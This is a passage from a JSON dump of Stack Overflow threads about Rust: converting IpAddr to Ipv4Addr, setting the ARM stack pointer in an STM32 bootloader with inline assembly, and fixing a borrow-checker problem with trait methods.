"https://stackoverflow.com/users/4614680/philipp-ludwig"}, "reply_to_user": {"reputation": 269539, "user_id": 155423, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/419218774d04a581476ea1887a0921e0?s=128&d=identicon&r=PG", "display_name": "Shepmaster", "link": "https://stackoverflow.com/users/155423/shepmaster"}, "edited": false, "score": 0, "creation_date": 1519582653, "post_id": 48957517, "comment_id": 84958580, "body": "I did read it (+ the 1st edition), but I have trouble applying theoretical information like this to real-world problems; this is just a personal weakness of me (I usually need a practical example to &quot;get&quot; something). If you feel that questions like this are not appropriate for SO, I will refrain from posting them in the future."}, {"owner": {"reputation": 269539, "user_id": 155423, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/419218774d04a581476ea1887a0921e0?s=128&d=identicon&r=PG", "display_name": "Shepmaster", "link": "https://stackoverflow.com/users/155423/shepmaster"}, "edited": false, "score": 0, "creation_date": 1519654405, "post_id": 48957517, "comment_id": 84985546, "body": "I do not think such questions are <i>inappropriate</i>, just that I feel that they&#39;ve already been answered by the book."}], "answers": [{"comments": [{"owner": {"reputation": 2369, "user_id": 4614680, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/c9b36fb2c1d356a919916f77e74f1c3c?s=128&d=identicon&r=PG&f=1", "display_name": "Philipp Ludwig", "link": "https://stackoverflow.com/users/4614680/philipp-ludwig"}, "edited": false, "score": 0, "creation_date": 1519430951, "post_id": 48957642, "comment_id": 84922819, "body": "Thanks for your answer! I hope you don&#39;t mind that I accepted Schwern&#39;s answer (just because it is a bit more elaborate)."}], "tags": [], "owner": {"reputation": 96489, "user_id": 788207, "user_type": "registered", "accept_rate": 84, "profile_image": "https://i.stack.imgur.com/KQmlY.jpg?s=128&g=1", "display_name": "Vladimir Matveev", "link": "https://stackoverflow.com/users/788207/vladimir-matveev"}, "is_accepted": false, "score": 5, "last_activity_date": 1519494423, "last_edit_date": 1519494423, "creation_date": 1519428566, "answer_id": 48957642, "question_id": 48957517, "link": "https://stackoverflow.com/questions/48957517/how-can-an-ipaddr-be-converted-to-an-ipv4addr/48957642#48957642", "title": "How can an IpAddr be converted to an IPv4Addr?", "body": "<p><a href=\"https://doc.rust-lang.org/std/net/enum.IpAddr.html\" rel=\"nofollow noreferrer\"><code>IpAddr</code></a> is an enum, so you can use pattern matching:</p>\n\n<pre><code>if let IpAddr::V4(ipv4) = ip {\n    // here ipv4 is of type IpV4Addr\n}\n\n// or, if you need to handle IPv6 as well\n\nmatch ip {\n    IpAddr::V4(ipv4) =&gt; { /* handle IPv4 */ }\n    IpAddr::V6(ipv6) =&gt; { /* handle IPv6 */ }\n}\n</code></pre>\n\n<p>Also, <code>IpAddr</code> is <code>Copy</code>, so you don't even need to worry about consuming its original value (the <code>ip</code> variable), it will just be implicitly copied for you.</p>\n"}, {"tags": [], "owner": {"reputation": 126353, "user_id": 14660, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/e55e0ec3c00f834d78fbdddeaa36e308?s=128&d=identicon&r=PG", "display_name": "Schwern", "link": "https://stackoverflow.com/users/14660/schwern"}, "is_accepted": true, "score": 10, "last_activity_date": 1519494406, "last_edit_date": 1519494406, "creation_date": 1519429306, "answer_id": 48957737, "question_id": 48957517, "link": "https://stackoverflow.com/questions/48957517/how-can-an-ipaddr-be-converted-to-an-ipv4addr/48957737#48957737", "title": "How can an IpAddr be converted to an IPv4Addr?", "body": "<p><a href=\"https://doc.rust-lang.org/std/net/enum.IpAddr.html\" rel=\"noreferrer\"><code>IpAddr</code></a> is an abstraction for IP addresses. It is an enum which holds either an <code>Ipv4Addr</code> or <code>Ipv6Addr</code> and some methods to provide abstract access to either.</p>\n\n<p>Rust won't let you cast an <code>IpAddr</code> to an <code>Ipv4Addr</code> because what if it's actually an <code>Ipv6Addr</code>? You have to handle that case as well. You convince Rust that you've handled all possibilities with <code>match</code>.</p>\n\n<pre><code>use std::net::{IpAddr, Ipv4Addr, Ipv6Addr};\n\nfn main() {\n    let ips = [\n        IpAddr::V4(Ipv4Addr::new(127, 0, 0, 1)),\n        IpAddr::V6(Ipv6Addr::new(0, 0, 0, 0, 0, 0, 0, 1)),\n    ];\n\n    for ip in ips.iter() {\n        match *ip {\n            IpAddr::V4(ip4) =&gt; println!(\"ipv4: {}, octets: {:?}\", ip4, ip4.octets()),\n            IpAddr::V6(ip6) =&gt; println!(\"ipv6: {}, segments: {:?}\", ip6, ip6.segments()),\n        }\n    }\n}\n</code></pre>\n\n<p>There is no need for a default case because the Rust type checker knows there is no other possibility. <code>ips</code> is an array of <code>IpAddr</code> and that contains only two possibilities, V4 or V6. In fact, Rust will warn if you put one there so should <code>IpAddr</code> change in the future you will be made aware with a compile error.</p>\n"}], "owner": {"reputation": 2369, "user_id": 4614680, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/c9b36fb2c1d356a919916f77e74f1c3c?s=128&d=identicon&r=PG&f=1", "display_name": "Philipp Ludwig", "link": "https://stackoverflow.com/users/4614680/philipp-ludwig"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1274, "favorite_count": 0, "accepted_answer_id": 48957737, "answer_count": 2, "score": 5, "last_activity_date": 1519494423, "creation_date": 1519427565, "question_id": 48957517, "link": "https://stackoverflow.com/questions/48957517/how-can-an-ipaddr-be-converted-to-an-ipv4addr", "title": "How can an IpAddr be converted to an IPv4Addr?", "body": "<p>In Rust, it is easy to create an <code>IpAddr</code> from an <code>IpV4Addr</code>:</p>\n\n<pre><code>let ipv4 = IpV4Addr::new(127,0,0,1);\nlet ip = IpAddr::V4(ipv4);\n</code></pre>\n\n<p>But it seems that there is no way back:</p>\n\n<pre><code>if ip.is_ipv4() {\n    let ipv4: IpV4Addr = .....?\n}\n</code></pre>\n\n<p>The reason is that I need to access the octets of the IPv4 address at some point (via <code>IPv4::octets</code>) to transfer them over the network. However, I'd like to use the more generic <code>IpAddr</code> representation in other parts of the application, since I want to implement IPv6 in the future, therefore making the network code not IPv4-specific.</p>\n"}, {"tags": ["rust", "embedded"], "comments": [{"owner": {"reputation": 3125, "user_id": 2878796, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/8bxWv.png?s=128&g=1", "display_name": "UnholySheep", "link": "https://stackoverflow.com/users/2878796/unholysheep"}, "edited": false, "score": 0, "creation_date": 1519424422, "post_id": 48956996, "comment_id": 84921020, "body": "<code>$0</code> looks like AT&amp;T x86 syntax - and in the link there are other examples that use Intel-like syntax (so just <code>0</code>)"}, {"owner": {"reputation": 230, "user_id": 3892459, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/ca3ee1b7e4b9fdc61ca36496aa447618?s=128&d=identicon&r=PG&f=1", "display_name": "teryret", "link": "https://stackoverflow.com/users/3892459/teryret"}, "reply_to_user": {"reputation": 3125, "user_id": 2878796, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/8bxWv.png?s=128&g=1", "display_name": "UnholySheep", "link": "https://stackoverflow.com/users/2878796/unholysheep"}, "edited": false, "score": 0, "creation_date": 1519424509, "post_id": 48956996, "comment_id": 84921050, "body": "Replacing it with just zero changes the compiler error to one that suggests that valid values are [r0, r15] (the CPU registers for this chip (of which R13 == SP))"}, {"owner": {"reputation": 3125, "user_id": 2878796, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/8bxWv.png?s=128&g=1", "display_name": "UnholySheep", "link": "https://stackoverflow.com/users/2878796/unholysheep"}, "edited": false, "score": 0, "creation_date": 1519424618, "post_id": 48956996, "comment_id": 84921084, "body": "Looking at the <a href=\"http://infocenter.arm.com/help/index.jsp?topic=/com.arm.doc.dui0068b/BABJAJIB.html\" rel=\"nofollow noreferrer\">reference for ARM <code>MOV</code></a> suggests that the correct syntax should be <code>MOV SP, #0</code>"}, {"owner": {"reputation": 230, "user_id": 3892459, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/ca3ee1b7e4b9fdc61ca36496aa447618?s=128&d=identicon&r=PG&f=1", "display_name": "teryret", "link": "https://stackoverflow.com/users/3892459/teryret"}, "edited": false, "score": 0, "creation_date": 1519424620, "post_id": 48956996, "comment_id": 84921087, "body": "<a href=\"http://www.st.com/content/ccc/resource/technical/document/programming_manual/6c/3a/cb/e7/e4/ea/44/9b/DM00046982.pdf/files/DM00046982.pdf/jcr:content/translations/en.DM00046982.pdf\" rel=\"nofollow noreferrer\">st.com/content/ccc/resource/technical/document/&hellip;</a> seems to suggest you can use either SP or R13"}, {"owner": {"reputation": 230, "user_id": 3892459, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/ca3ee1b7e4b9fdc61ca36496aa447618?s=128&d=identicon&r=PG&f=1", "display_name": "teryret", "link": "https://stackoverflow.com/users/3892459/teryret"}, "reply_to_user": {"reputation": 3125, "user_id": 2878796, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/8bxWv.png?s=128&g=1", "display_name": "UnholySheep", "link": "https://stackoverflow.com/users/2878796/unholysheep"}, "edited": false, "score": 0, "creation_date": 1519424693, "post_id": 48956996, "comment_id": 84921112, "body": "@UnholySheep #0 gives the same error as regular zero; &quot;operand must be a register in range [r0, r15]&quot;"}, {"owner": {"reputation": 3125, "user_id": 2878796, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/8bxWv.png?s=128&g=1", "display_name": "UnholySheep", "link": "https://stackoverflow.com/users/2878796/unholysheep"}, "edited": false, "score": 1, "creation_date": 1519424802, "post_id": 48956996, "comment_id": 84921150, "body": "The reference you linked states <i>&quot;You can use SP and PC only in the MOV instruction, with the following restrictions: The second operand must be a register without shift; You must not specify the S suffix&quot;</i> - so you cannot use <code>MOV SP</code> with an immediate value"}, {"owner": {"reputation": 230, "user_id": 3892459, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/ca3ee1b7e4b9fdc61ca36496aa447618?s=128&d=identicon&r=PG&f=1", "display_name": "teryret", "link": "https://stackoverflow.com/users/3892459/teryret"}, "edited": false, "score": 0, "creation_date": 1519424939, "post_id": 48956996, "comment_id": 84921189, "body": "I don&#39;t think that I am doing that; the value of stack_pointer isn&#39;t known until runtime... unless maybe the asm! macro is filling in a memory address?  But if that was the case why complain about the $ token?"}, {"owner": {"reputation": 5101, "user_id": 700170, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/gZ8hw.png?s=128&g=1", "display_name": "Morten Jensen", "link": "https://stackoverflow.com/users/700170/morten-jensen"}, "edited": false, "score": 0, "creation_date": 1519425274, "post_id": 48956996, "comment_id": 84921303, "body": "@teryret <i>&quot;The second operand must be a register without shift&quot;</i> &lt;-- $0 is not a register is it? Maybe that&#39;s what the compiler tells you: <i>&quot;operand must be a register in range [r0, r15]&quot;</i>. I would try MOV&#39;ing $0 or whatever, into a register and then into SP, using two instructions. Something like <code>MOV R1, #0</code> <code>MOV SP, R1</code>"}, {"owner": {"reputation": 230, "user_id": 3892459, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/ca3ee1b7e4b9fdc61ca36496aa447618?s=128&d=identicon&r=PG&f=1", "display_name": "teryret", "link": "https://stackoverflow.com/users/3892459/teryret"}, "edited": false, "score": 0, "creation_date": 1519425414, "post_id": 48956996, "comment_id": 84921357, "body": "Ok, but isn&#39;t that begging the question?  If I replace SP with R6 the same thing happens... how do I get something to cross the threshold from rust local variable to value in register?"}, {"owner": {"reputation": 230, "user_id": 3892459, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/ca3ee1b7e4b9fdc61ca36496aa447618?s=128&d=identicon&r=PG&f=1", "display_name": "teryret", "link": "https://stackoverflow.com/users/3892459/teryret"}, "edited": false, "score": 0, "creation_date": 1519425580, "post_id": 48956996, "comment_id": 84921404, "body": "I can simplify it even more, <code>asm!(&quot;MOV R0, #0x08008000&quot;);</code> doesn&#39;t build, and that doesn&#39;t involve any string interpolation nonsense.  Edit: oh wait, nm, the value is too large to be a literal"}, {"owner": {"reputation": 5101, "user_id": 700170, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/gZ8hw.png?s=128&g=1", "display_name": "Morten Jensen", "link": "https://stackoverflow.com/users/700170/morten-jensen"}, "edited": false, "score": 0, "creation_date": 1519425722, "post_id": 48956996, "comment_id": 84921452, "body": "My example was really bad, I see that now. I do think that is your problem however. That you need to get the variable into a register and then <code>MOV SP, Rx</code>. I don&#39;t know enough about Rust inline ASM to be able to help with getting access to Rust variables in the inline ASM. In C you can cheat and put the ASM code in a function and rely on the C calling convention on ARM, putting the arguments in R0, R1 etc. Don&#39;t know if that is any help. I guess not, since I wouldn&#39;t be comfortable manipulating SP in a call :("}, {"owner": {"reputation": 230, "user_id": 3892459, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/ca3ee1b7e4b9fdc61ca36496aa447618?s=128&d=identicon&r=PG&f=1", "display_name": "teryret", "link": "https://stackoverflow.com/users/3892459/teryret"}, "edited": false, "score": 0, "creation_date": 1519425804, "post_id": 48956996, "comment_id": 84921472, "body": "I&#39;m on board with that, just trying to figure out how to.  I can get the first 16 bits of the address of the address into a register, just trying to figure out the right way to get the other 16 bits in there"}, {"owner": {"reputation": 5101, "user_id": 700170, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/gZ8hw.png?s=128&g=1", "display_name": "Morten Jensen", "link": "https://stackoverflow.com/users/700170/morten-jensen"}, "reply_to_user": {"reputation": 3125, "user_id": 2878796, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/8bxWv.png?s=128&g=1", "display_name": "UnholySheep", "link": "https://stackoverflow.com/users/2878796/unholysheep"}, "edited": false, "score": 2, "creation_date": 1519426214, "post_id": 48956996, "comment_id": 84921609, "body": "Sorry for the comment-spam, I don&#39;t think I can help any more. I&#39;ve upvoted your question because you&#39;ve done a proper effort. Consider editing the question to reflect your current challenges. the compiler messages and insight from @UnholySheep."}, {"owner": {"reputation": 76010, "user_id": 168986, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/MqorX.jpg?s=128&g=1", "display_name": "Clifford", "link": "https://stackoverflow.com/users/168986/clifford"}, "edited": false, "score": 0, "creation_date": 1519547847, "post_id": 48956996, "comment_id": 84948601, "body": "Withe respect to the &quot;billion reasons&quot; it still may not work, does your bootloader disable all interrupts, correctly set the application&#39;s initial vector table and jump to the correct entry point that will establish the run-time environment expected by the application? The SP and PC should be assigned from the application&#39;s vectortable to emulate a direct start-up of the application - see <a href=\"https://stackoverflow.com/a/14406706/168986\">stackoverflow.com/a/14406706/168986</a> - I have not offered an answer because I do not know Rust."}], "answers": [{"comments": [{"owner": {"reputation": 76010, "user_id": 168986, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/MqorX.jpg?s=128&g=1", "display_name": "Clifford", "link": "https://stackoverflow.com/users/168986/clifford"}, "edited": false, "score": 1, "creation_date": 1519547942, "post_id": 48962626, "comment_id": 84948634, "body": "I don&#39;t know Rust, so cannot answer but I know STM32 (and Cortex-M in general), and tools normally generate a vector table with SP and Entry point in the first two words. Jumping to the entry-point by a call after setting the SP would allow you to return to the bootloader, which may not be wanted. It may be better to load the PC directly in assembler too - as I have in <a href=\"https://stackoverflow.com/a/14406706/168986\">stackoverflow.com/a/14406706/168986</a> (in C/Assembler) using only the vector table data. It ensures that the run-time environment is re-esablished as defined by the application build rather than the bootloader."}, {"owner": {"reputation": 4594, "user_id": 1478356, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/996ee463b8f6b17a738f2e23f7ecfe9f?s=128&d=identicon&r=PG", "display_name": "Stefan", "link": "https://stackoverflow.com/users/1478356/stefan"}, "reply_to_user": {"reputation": 76010, "user_id": 168986, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/MqorX.jpg?s=128&g=1", "display_name": "Clifford", "link": "https://stackoverflow.com/users/168986/clifford"}, "edited": false, "score": 0, "creation_date": 1519558890, "post_id": 48962626, "comment_id": 84950967, "body": "@Clifford At least in release mode the call to entry_point is optimized to a tail call (on my system); i.e. it actually just branches (<code>bx</code>), same as my <code>global_asm!</code> variant.  It would probably be better to use <code>entry_point: fn() -&gt; !</code> (but then it doesn&#39;t use tail call optimization...)."}, {"owner": {"reputation": 76010, "user_id": 168986, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/MqorX.jpg?s=128&g=1", "display_name": "Clifford", "link": "https://stackoverflow.com/users/168986/clifford"}, "edited": false, "score": 1, "creation_date": 1519563265, "post_id": 48962626, "comment_id": 84952134, "body": "I question however where the value for entry point comes from.  In any particular application build it may vary, whereas the initial vector table is at the base address specified to the linker.  So what I am suggesting is to take both that SP and PC from this known location.  You can then boot any application built in any toolchains given the correct base address."}, {"owner": {"reputation": 4594, "user_id": 1478356, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/996ee463b8f6b17a738f2e23f7ecfe9f?s=128&d=identicon&r=PG", "display_name": "Stefan", "link": "https://stackoverflow.com/users/1478356/stefan"}, "reply_to_user": {"reputation": 76010, "user_id": 168986, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/MqorX.jpg?s=128&g=1", "display_name": "Clifford", "link": "https://stackoverflow.com/users/168986/clifford"}, "edited": false, "score": 0, "creation_date": 1519563551, "post_id": 48962626, "comment_id": 84952244, "body": "Well, whether you extract SP and PC from the vector table and pass it to <code>go</code> or pass the address to (SP, PC) to <code>go</code> is not a big difference imho.  Where those addresses come from might still be the OPs main problem..."}, {"owner": {"reputation": 76010, "user_id": 168986, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/MqorX.jpg?s=128&g=1", "display_name": "Clifford", "link": "https://stackoverflow.com/users/168986/clifford"}, "edited": false, "score": 1, "creation_date": 1519587090, "post_id": 48962626, "comment_id": 84960226, "body": "I don&#39;t disagree - but the application is built independently of the bootloader, possibly in a different source language and toolchain, so using the vector table ensures the application is started up as the application build expects.  It may be the case that the OP is indeed doing that, but if so you do not need two addresses.  My comment was not a criticism of this answer, more information for the OP in case the possibility had not occurred."}], "tags": [], "owner": {"reputation": 4594, "user_id": 1478356, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/996ee463b8f6b17a738f2e23f7ecfe9f?s=128&d=identicon&r=PG", "display_name": "Stefan", "link": "https://stackoverflow.com/users/1478356/stefan"}, "is_accepted": true, "score": 3, "last_activity_date": 1519559034, "last_edit_date": 1519559034, "creation_date": 1519473716, "answer_id": 48962626, "question_id": 48956996, "link": "https://stackoverflow.com/questions/48956996/how-can-i-assign-a-value-to-the-stack-pointer-of-an-arm-chip-in-rust/48962626#48962626", "title": "How can I assign a value to the stack pointer of an ARM chip in Rust?", "body": "<p>It seems to me you're having two problems:</p>\n\n<ol>\n<li>figuring out what the assembly code should look like in the end</li>\n<li>how to build it from Rust.</li>\n</ol>\n\n<p>The second part seems easy with <code>global_asm!</code>:</p>\n\n<pre><code>#![feature(global_asm)]\n\nglobal_asm!(r#\"\n.global go\ngo:\n    mov sp, r0\n    bx r1\n\"#);\nextern \"C\" {\n    pub fn go(addr: u32, entry_point: extern fn());\n}\n</code></pre>\n\n<p>or with normal <code>asm!</code>:</p>\n\n<pre><code>#![feature(asm)]\n\n#[no_mangle]\npub unsafe fn go(addr: u32, entry_point: fn()) {\n    asm!(\"mov sp, r0\" :: \"{r0}\"(addr) : \"sp\");\n    entry_point()\n}\n</code></pre>\n\n<p>I think the <code>\"0\"(stack_pointer)</code> part didn't work because <code>stack_pointer</code> is not a constant.</p>\n\n<p>Your Version B results in the same ASM code; but it really should mark \"sp\" as clobbered, and <code>\"{r0}\"(addr)</code> makes sure the first argument really is in <code>r0</code>.</p>\n\n<p><a href=\"https://stackoverflow.com/users/168986/clifford\">Clifford</a> seems to prefer passing a pointer to a \"vector table\", which could look like this:</p>\n\n<pre><code>#[repr(C)]\npub struct VectorTable {\n    stack_pointer: u32,\n    entry_point: extern fn() -&gt; !,\n}\n\nglobal_asm!(r#\"\n.global go\ngo:\n    ldr sp, [r0]\n    ldr pc, [r0, #4]\n\"#);\nextern \"C\" {\n    pub fn go(vt: &amp;VectorTable) -&gt; !;\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 269539, "user_id": 155423, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/419218774d04a581476ea1887a0921e0?s=128&d=identicon&r=PG", "display_name": "Shepmaster", "link": "https://stackoverflow.com/users/155423/shepmaster"}, "is_accepted": false, "score": 0, "last_activity_date": 1519757667, "creation_date": 1519757667, "answer_id": 49015996, "question_id": 48956996, "link": "https://stackoverflow.com/questions/48956996/how-can-i-assign-a-value-to-the-stack-pointer-of-an-arm-chip-in-rust/49015996#49015996", "title": "How can I assign a value to the stack pointer of an ARM chip in Rust?", "body": "<p>I ended up going with @stefan's implementation of @clifford's approach along with the following code to call it:</p>\n\n<pre><code>let firmware_address = 0x08008000u32;\nunsafe {\n    let scb = &amp;*stm32f40x::SCB::ptr();\n    scb.vtor.write(firmware_address);\n    asm::isb();\n    go(&amp;*(firmware_address as *const VectorTable));\n}\n</code></pre>\n"}], "owner": {"reputation": 230, "user_id": 3892459, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/ca3ee1b7e4b9fdc61ca36496aa447618?s=128&d=identicon&r=PG&f=1", "display_name": "teryret", "link": "https://stackoverflow.com/users/3892459/teryret"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 781, "favorite_count": 0, "accepted_answer_id": 48962626, "answer_count": 2, "score": 5, "last_activity_date": 1519757667, "creation_date": 1519424178, "last_edit_date": 1519757621, "question_id": 48956996, "link": "https://stackoverflow.com/questions/48956996/how-can-i-assign-a-value-to-the-stack-pointer-of-an-arm-chip-in-rust", "title": "How can I assign a value to the stack pointer of an ARM chip in Rust?", "body": "<p>I'm trying to write a bootloader for an STM32 in Rust and I can't figure out how to correctly populate the stack pointer.  Near as I can tell the code should be:</p>\n\n<pre><code>asm!(\"MOV SP, $0\" :: \"0\"(stack_pointer));  // set the stack pointer\n</code></pre>\n\n<p>but the compiler disagrees:</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>error: invalid operand in inline asm: 'MOV SP, $0'\n  --&gt; src/main.rs:38:5\n   |\n38 |     asm!(\"MOV SP, $0\" :: \"0\"(stack_pointer));  // set the stack pointer\n   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nerror: &lt;inline asm&gt;:1:11: error: unexpected token in operand\n        MOV SP, \n                ^\n\n  --&gt; src/main.rs:38:5\n   |\n38 |     asm!(\"MOV SP, $0\" :: \"0\"(stack_pointer));  // set the stack pointer\n   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n</code></pre>\n\n<p>What am I doing wrong?  It seem to be complaining about the dollar sign, but I got that directly from <a href=\"https://doc.rust-lang.org/unstable-book/language-features/asm.html\" rel=\"nofollow noreferrer\">the documentation</a>.</p>\n\n<p>Per the conversation in the comments, I've tried two things, both of which compile(!) but neither of which seem to work (but that could be for any of a billion reasons, still working on it):</p>\n\n<p>Version A:</p>\n\n<pre><code>asm!(\"MOV R0, #0x0800\");\nasm!(\"LSL R0, R0, #16\");\nasm!(\"MOV R1, #0x8000\");\nasm!(\"ORR R2, R1, R0\");\nasm!(\"LDRT R0, [R2]\");\nasm!(\"MOV SP, R0\");\nentry_point()\n</code></pre>\n\n<p>Version B:</p>\n\n<pre><code>#[inline(never)]\nunsafe fn go(_addr: u32, entry_point: fn()-&gt;()) {\n    asm!(\"MOV SP, R0\");\n    entry_point()\n}\n</code></pre>\n"}, {"tags": ["rust"], "comments": [{"owner": {"reputation": 5308, "user_id": 4038191, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/10ec10e81b5315fe2147c38bf3e15e9e?s=128&d=identicon&r=PG", "display_name": "EvilTak", "link": "https://stackoverflow.com/users/4038191/eviltak"}, "edited": false, "score": 1, "creation_date": 1519445629, "post_id": 48954007, "comment_id": 84925336, "body": "This to me looks like a code smell. First, the <code>State::add_text</code> method impl on <code>Draft</code> has nothing to do with the <code>Draft</code> struct <i>whatsoever</i> - you might as well remove the <code>&amp;self</code> parameter and be done with it. Second, as an external consumer of this hypothetical library I&#39;d expect the <code>add_text</code> method to be on the <code>Post</code> struct itself. You would be much better off moving <code>add_text</code> to <code>Post</code>, and looking up information or mutating the <code>state</code> field as and when needed. If you only want to <code>add_text</code> if the post is a draft, you can check if <code>self.state</code> is a <code>Draft</code> inside <code>Post::add_text</code>."}], "answers": [{"comments": [{"owner": {"reputation": 4924, "user_id": 2862719, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/yzhk5.png?s=128&g=1", "display_name": "m00am", "link": "https://stackoverflow.com/users/2862719/m00am"}, "edited": false, "score": 0, "creation_date": 1519467538, "post_id": 48961427, "comment_id": 84929491, "body": "Thank you, this approach did not occur to me. I agree with both you and @EvilTak that this most likely is a bad way to do this (hence, the last paragraph of my question). On the other hand, this was a nice opportunity to learn more about borrowing, so thanks for helping me with that. I will accept an answer on Monday."}], "tags": [], "owner": {"reputation": 227, "user_id": 3740219, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/edd0aaf2ca00de2ce7edb1003471071e?s=128&d=identicon&r=PG", "display_name": "Nuchs", "link": "https://stackoverflow.com/users/3740219/nuchs"}, "is_accepted": true, "score": 2, "last_activity_date": 1519465287, "creation_date": 1519465287, "answer_id": 48961427, "question_id": 48954007, "link": "https://stackoverflow.com/questions/48954007/how-to-pass-a-mutable-self-reference-on-to-a-trait-method/48961427#48961427", "title": "How to pass a mutable self reference on to a trait method?", "body": "<p>With structs Rust is smart enough to be able to do disjoint borrows so you don't need to pass a mutable reference to the entire <code>Post</code> struct, just the part of it you need to modify (in this case content).</p>\n\n<pre><code>trait State {\n    // snip\n\n    // Modify the method on the add_text trait so that it\n    // takes a mutable reference to String\n    fn add_text(&amp;self, content: &amp;mut String, text: &amp;str) { }\n}\n\nstruct Draft { }\n\nimpl State for Draft {\n    // snip\n\n    // Update the implementation of State for Draft so that it\n    // matches the new signature\n    fn add_text(&amp;self, content: &amp;mut String, text: &amp;str) {\n        content.push_str(text);\n    }\n}\n\nimpl Post {\n    // snip\n\n    pub fn add_text(&amp;mut self, text: &amp;str){\n        let state = self.state.as_ref().unwrap();  \n\n        // Now when you call add_text you don't require a mutable \n        // reference to self, just to self.content and so the \n        // borrow checker is happy\n        state.add_text(&amp;mut self.content, text);  \n    }\n}\n</code></pre>\n\n<p>This should work but it feels a bit forced, (as EvilTak points out the reference to self in <code>Draft::add_text</code> is redundant). I guess that's part of the point of the exercise though; while it is possible to implement certain patterns from OOP in Rust there are better ways to model the problem.</p>\n"}], "owner": {"reputation": 4924, "user_id": 2862719, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/yzhk5.png?s=128&g=1", "display_name": "m00am", "link": "https://stackoverflow.com/users/2862719/m00am"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1669, "favorite_count": 0, "accepted_answer_id": 48961427, "answer_count": 1, "score": 4, "last_activity_date": 1519465287, "creation_date": 1519409887, "question_id": 48954007, "link": "https://stackoverflow.com/questions/48954007/how-to-pass-a-mutable-self-reference-on-to-a-trait-method", "title": "How to pass a mutable self reference on to a trait method?", "body": "<p>While working through the <a href=\"https://doc.rust-lang.org/book/second-edition/ch17-03-oo-design-patterns.html\" rel=\"nofollow noreferrer\">OOP-Chapter</a> of the Rust book (2nd Edition) I took on the optional task to implement the method <code>add_text</code> for the following struct</p>\n\n<pre><code>pub struct Post {\n    state: Option&lt;Box&lt;State&gt;&gt;,\n    content: String,\n}\n</code></pre>\n\n<p>There are three structs that implement the <code>State</code> trait, but only the <code>Draft</code> struct should actually do something. I implemented this as follows</p>\n\n<pre><code>trait State {\n    // snip\n    fn add_text(&amp;self, post: &amp;mut Post, text: &amp;str) { }\n}\n\n\nstruct Draft { }\n\nimpl State for Draft {\n    // snip\n    fn add_text(&amp;self, post: &amp;mut Post, text: &amp;str) {\n        post.content.push_str(text);\n    }\n}\n</code></pre>\n\n<p>My problem is that in order to get the <code>State</code> from my post struct to call the <code>add_text</code> method I immutably borrow <code>self</code> (in <code>Post</code>) and can not pass on a mutable reference to the <code>add_text</code> method of the <code>State</code> trait:</p>\n\n<pre><code>impl Post {\n    // snip\n\n    pub fn add_text(&amp;mut self, text: &amp;str){\n        let state = self.state.as_ref().unwrap();  // This immutably borrows self\n        state.add_text(self, text);  // so that this mutable borrow is no longer possible\n    }\n}\n</code></pre>\n\n<p>How do I deal with this dilemma? I definitely need a mutable reference to the <code>Post</code>, otherwise I can't change its text. On the other hand, I need to get the <code>State</code> first since otherwise I can not even call the method.</p>\n\n<p>One way to work around this would be be to change <code>add_text</code> to <code>get_text_to_add</code> which would not require mutability of the <code>Post</code>, but I would like to make sure that I am not overseeing any options to solve this.</p>\n"}, {"tags": ["rust", "traits"], "comments": [{"owner": {"reputation": 3212, "user_id": 2731452, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/xA89V.jpg?s=128&g=1", "display_name": "red75prime", "link": "https://stackoverflow.com/users/2731452/red75prime"}, "edited": false, "score": 0, "creation_date": 1519410370, "post_id": 48952627, "comment_id": 84914791, "body": "You can do something like this: <a href=\"https://play.rust-lang.org/?gist=6d49d7c1c1cc97393328eb18c68cb43d&amp;version=stable\" rel=\"nofollow 